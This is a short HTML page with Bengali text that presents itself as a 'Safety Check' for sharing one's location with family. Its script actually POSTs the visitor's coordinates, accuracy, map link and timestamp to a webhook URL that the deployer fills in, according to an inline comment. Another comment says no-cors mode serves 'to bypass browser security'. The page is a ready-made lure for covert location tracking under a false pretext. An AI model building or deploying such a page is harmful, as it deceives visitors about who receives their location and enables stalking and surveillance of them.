<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safety Check-in</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
            margin: 0;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h2 { color: #1a73e8; }
        p { color: #5f6368; line-height: 1.6; }
        .btn {
            background-color: #1a73e8;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.3s;
        }
        .btn:hover { background-color: #1557b0; }
        #status { margin-top: 20px; font-weight: bold; color: #d93025; }
    </style>
</head>
<body>

<div class="container">
    <h2>নিরাপত্তা যাচাই (Safety Check)</h2>
    <p>আপনার বর্তমান অবস্থানটি শেয়ার করতে নিচের বাটনে ক্লিক করুন। এটি আপনার পরিবারের কাছে আপনার লোকেশন পাঠাবে।</p>
    <button class="btn" onclick="getLocation()">শেয়ার করুন</button>
    <div id="status"></div>
</div>

<script>
    // আপনার Webhook.site এর লিঙ্কটি এখানে বসান
    const receiverUrl = "YOUR_WEBHOOK_URL_HERE";

    function getLocation() {
        const status = document.getElementById('status');
        
        if (navigator.geolocation) {
            status.innerHTML = "লোকেশন খোঁজা হচ্ছে...";
            navigator.geolocation.getCurrentPosition(sendPosition, showError);
        } else {
            status.innerHTML = "আপনার ব্রাউজারটি লোকেশন সাপোর্ট করে না।";
        }
    }

    function sendPosition(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        // ডাটা পাঠানোর প্রস্তুতি
        const data = {
            latitude: lat,
            longitude: lon,
            accuracy: accuracy + " meters",
            googleMaps: googleMapsLink,
            timestamp: new Date().toLocaleString()
        };

        // Fetch API দিয়ে ডাটা Webhook এ পাঠানো
        fetch(receiverUrl, {
            method: 'POST',
            mode: 'no-cors', // ব্রাউজার সিকিউরিটি বাইপাস করতে
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'application/json' }
        }).then(() => {
            document.getElementById('status').style.color = "#1e8e3e";
            document.getElementById('status').innerHTML = "সফলভাবে পাঠানো হয়েছে।";
        }).catch(err => {
            document.getElementById('status').innerHTML = "ত্রুটি ঘটেছে। আবার চেষ্টা করুন।";
        });
    }

    function showError(error) {
        const status = document.getElementById('status');
        switch(error.code) {
            case error.PERMISSION_DENIED:
                status.innerHTML = "আপনি লোকেশন পারমিশন দেননি।";
                break;
            case error.POSITION_UNAVAILABLE:
                status.innerHTML = "লোকেশন তথ্য পাওয়া যাচ্ছে না।";
                break;
            case error.TIMEOUT:
                status.innerHTML = "অনুরোধটি সময় শেষ হয়ে গেছে।";
                break;
            default:
                status.innerHTML = "অজানা ত্রুটি ঘটেছে।";
                break;
        }
    }
</script>

</body>
</html>
